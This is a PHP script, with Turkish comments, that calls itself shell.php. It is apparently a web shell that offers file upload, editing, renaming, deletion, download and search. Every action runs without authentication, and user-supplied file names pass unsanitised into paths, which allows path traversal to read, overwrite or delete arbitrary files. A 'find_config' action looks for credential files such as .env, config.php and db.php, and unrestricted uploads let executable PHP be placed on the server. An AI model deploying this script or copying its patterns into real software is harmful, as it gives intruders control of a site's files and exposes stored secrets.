<?php
// Dosya Yükleme
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_FILES['file'])) {
        $uploadDir = 'uploads/';
        $uploadFile = $uploadDir . basename($_FILES['file']['name']);

        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
            echo "Dosya başarıyla yüklendi!";
        } else {
            echo "Dosya yüklenirken bir hata oluştu!";
        }
    }

    // Dosya Silme
    if (isset($_POST['action']) && $_POST['action'] == 'delete') {
        $file = 'uploads/' . $_POST['file'];
        if (file_exists($file)) {
            if (unlink($file)) {
                echo "Dosya başarıyla silindi!";
            } else {
                echo "Dosya silinirken bir hata oluştu!";
            }
        } else {
            echo "Dosya bulunamadı!";
        }
    }

    // Dosya Düzenleme
    if (isset($_POST['action']) && $_POST['action'] == 'edit') {
        $file = 'uploads/' . $_POST['file'];
        $content = $_POST['content'];
        if (file_exists($file)) {
            if (file_put_contents($file, $content)) {
                echo "Dosya başarıyla güncellendi!";
            } else {
                echo "Dosya düzenlenirken bir hata oluştu!";
            }
        } else {
            echo "Dosya bulunamadı!";
        }
    }

    //Yeniden Adlandırma
    if (isset($_POST['action']) && $_POST['action'] == 'rename') {
        $oldName = 'uploads/' . $_POST['old_name'];
        $newName = 'uploads/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo "Dosya başarıyla yeniden adlandırıldı!";
            } else {
                echo "Dosya yeniden adlandırılırken bir hata oluştu!";
            }
        } else {
            echo "Dosya bulunamadı!";
        }
    }
}

// Dosya Listeleme 
if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['action']) && $_GET['action'] == 'list') {
    $files = scandir('uploads/');
    $filesList = '';

    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $filesList .= '<li>' . htmlspecialchars($file) . 
                ' <button onclick="deleteFile(\'' . htmlspecialchars($file) . '\')">Sil</button>' .
                ' <button onclick="editFile(\'' . htmlspecialchars($file) . '\')">Düzenle</button>' .
                ' <button onclick="viewPermissions(\'' . htmlspecialchars($file) . '\')">İzinleri Gör</button>' .
                ' <a href="shell.php?action=download&file=' . urlencode($file) . '"><button>İndir</button></a>' .
                ' <button onclick="renameFile(\'' . htmlspecialchars($file) . '\')">Yeniden Adlandır</button>' .
                '</li>';
        }
    }

    echo $filesList;
}

// Dosya İzinleri
if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['action']) && $_GET['action'] == 'permissions') {
    $file = 'uploads/' . $_GET['file'];
    if (file_exists($file)) {
        $permissions = substr(sprintf('%o', fileperms($file)), -4);
        echo "Dosya izinleri: " . $permissions;
    } else {
        echo "Dosya bulunamadı!";
    }
}

// Konfigürasyon
if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['action']) && $_GET['action'] == 'find_config') {
    $configFiles = ['config.php', '.env', 'settings.php', 'db.php'];
    $foundFiles = '';

    foreach ($configFiles as $configFile) {
        if (file_exists('uploads/' . $configFile)) {
            $foundFiles .= '<li>' . htmlspecialchars($configFile) . ' - <strong>Bulundu</strong></li>';
        }
    }

    if ($foundFiles == '') {
        echo 'Hiçbir konfigürasyon dosyası bulunamadı.';
    } else {
        echo '<ul>' . $foundFiles . '</ul>';
    }
}

// Dosya Arama 
if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['action']) && $_GET['action'] == 'search') {
    $searchPattern = isset($_GET['query']) ? $_GET['query'] : '';
    if ($searchPattern !== '') {
        $files = scandir('uploads/');
        $foundFiles = '';

        foreach ($files as $file) {
            if (stripos($file, $searchPattern) !== false) {
                $foundFiles .= '<li>' . htmlspecialchars($file) . ' - <strong>Bulundu</strong></li>';
            }
        }

        if ($foundFiles == '') {
            echo 'Aranan kriterlere uygun dosya bulunamadı.';
        } else {
            echo '<ul>' . $foundFiles . '</ul>';
        }
    } else {
        echo 'Arama kriteri belirtilmedi.';
    }
}

// Dosya İndirme
if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['action']) && $_GET['action'] == 'download') {
    $file = 'uploads/' . $_GET['file'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "Dosya bulunamadı!";
    }
}

// Help Bilgisi 
if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['action']) && $_GET['action'] == 'help') {
    $helpText = "
        <h3>Yardım Bilgisi:</h3>
        <ul>
            <li><strong>Dosya Yükle:</strong> 'Dosya Yükle' butonunu kullanarak bir dosya seçin ve yükleyin.</li>
            <li><strong>Dosya Sil:</strong> Listeden bir dosya seçin ve 'Sil' butonuna tıklayın.</li>
            <li><strong>Dosya Düzenle:</strong> Listeden bir dosya seçin ve 'Düzenle' butonuna tıklayarak içeriği güncelleyin.</li>
            <li><strong>İzinleri Gör:</strong> Listeden bir dosya seçin ve 'İzinleri Gör' butonuna tıklayın.</li>
            <li><strong>Dosya İndir:</strong> Listeden bir dosya seçin ve 'İndir' butonuna tıklayın.</li>
            <li><strong>Yeniden Adlandır:</strong> Listeden bir dosya seçin ve 'Yeniden Adlandır' butonuna tıklayarak yeni adını girin.</li>
            <li><strong>Konfigürasyon Dosyalarını Bul:</strong> 'Konfigürasyon Dosyalarını Bul' butonuna tıklayarak önemli konfigürasyon dosyalarını bulun.</li>
            <li><strong>Dosya Ara:</strong> 'Dosya Ara' butonuna tıklayın ve aramak istediğiniz dosyanın adını veya bir kısmını girin.</li>
        </ul>";
        echo $helpText;
}
?>

